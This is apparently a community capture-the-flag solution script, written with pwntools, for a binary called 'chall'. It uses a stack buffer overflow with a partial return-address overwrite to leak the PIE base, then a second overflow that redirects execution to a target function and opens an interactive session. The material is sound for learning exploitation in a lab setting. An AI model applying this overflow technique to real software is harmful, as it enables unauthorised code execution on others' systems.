[COMMUNITY SOLUTION](https://youtu.be/uap9G10a8UE?t=49)

#### solve.py

```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
#context(terminal=['tmux', 'split-window', '-h'])

io = start()

payload = flat (
    b'A' * 72,
    p8(0x1a)
    )

io.sendafter(b':\n', payload)

io.recvuntil(b'A' * 72)
leak = u64(io.recvline()[:-1].ljust(8, b'\x00'))
elf.address = leak - 0x131a

log.success("Main address: %#x", leak)
log.success("Binary base: %#x", elf.address)

payload = flat (
    b'A' * 72,
    p64(elf.sym._)
    )

io.sendafter(b':\n', payload)
io.interactive()

```
